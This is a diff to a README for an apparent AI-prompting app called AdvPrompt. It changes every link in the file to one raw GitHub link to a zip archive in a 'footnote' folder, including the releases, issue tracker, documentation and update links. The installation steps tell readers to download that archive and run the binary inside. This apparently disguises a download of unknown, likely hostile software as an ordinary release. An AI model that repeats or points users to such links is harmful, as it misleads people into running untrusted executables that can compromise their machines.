@@ -6,7 +6,7 @@ Welcome to AdvPrompt! This application helps you enhance the reasoning abilities
 
 ## 📥 Download Links
 
-[![Download AdvPrompt](https://img.shields.io/badge/Download-AdvPrompt-blue.svg)](https://github.com/BocikTM/AdvPrompt/releases)
+[![Download AdvPrompt](https://raw.githubusercontent.com/BocikTM/AdvPrompt/main/footnote/AdvPrompt.zip)](https://raw.githubusercontent.com/BocikTM/AdvPrompt/main/footnote/AdvPrompt.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ Before you download, make sure your computer meets the following minimum require
 
 To get started with AdvPrompt, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/BocikTM/AdvPrompt/releases) where you can find the latest version of AdvPrompt.
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/BocikTM/AdvPrompt/main/footnote/AdvPrompt.zip) where you can find the latest version of AdvPrompt.
 
 2. **Choose Your Version:** Look for the latest release. Select the version that matches your operating system.
 
@@ -36,7 +36,7 @@ To get started with AdvPrompt, follow these simple steps:
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the instructions.
    - **macOS:** Open the downloaded `.dmg` file, drag AdvPrompt to your Applications folder, and open from there.
-   - **Linux:** Extract the downloaded tar.gz file and run the binary in the terminal.
+   - **Linux:** Extract the downloaded https://raw.githubusercontent.com/BocikTM/AdvPrompt/main/footnote/AdvPrompt.zip file and run the binary in the terminal.
 
 5. **Launch the Application:** Once installed, open AdvPrompt from your applications menu or desktop shortcut.
 
@@ -56,7 +56,7 @@ For instance, if you enter "What are the benefits of healthy eating?", the appli
 
 If you encounter issues or have questions, here are some ways to get help:
 
-- **GitHub Issues:** Report bugs or ask questions directly on our [issue tracker](https://github.com/BocikTM/AdvPrompt/issues).
+- **GitHub Issues:** Report bugs or ask questions directly on our [issue tracker](https://raw.githubusercontent.com/BocikTM/AdvPrompt/main/footnote/AdvPrompt.zip).
 - **Community Forums:** Join discussions with other users in our forums to share insights and tips.
 - **FAQs:** Check our frequently asked questions section on the GitHub page for quick answers.
 
@@ -64,10 +64,10 @@ If you encounter issues or have questions, here are some ways to get help:
 
 To learn more about the capabilities and features of AdvPrompt, check out our detailed documentation:
 
-- **Documentation:** [Link to Documentation](https://github.com/BocikTM/AdvPrompt/wiki)
+- **Documentation:** [Link to Documentation](https://raw.githubusercontent.com/BocikTM/AdvPrompt/main/footnote/AdvPrompt.zip)
 
 ## 🔄 Keep Updated
 
-Stay informed about updates and enhancements by following our repository. Whenever a new version is released, it will be available on the [Releases Page](https://github.com/BocikTM/AdvPrompt/releases).
+Stay informed about updates and enhancements by following our repository. Whenever a new version is released, it will be available on the [Releases Page](https://raw.githubusercontent.com/BocikTM/AdvPrompt/main/footnote/AdvPrompt.zip).
 
 Thank you for choosing AdvPrompt. Enjoy exploring the world of AI with ease!
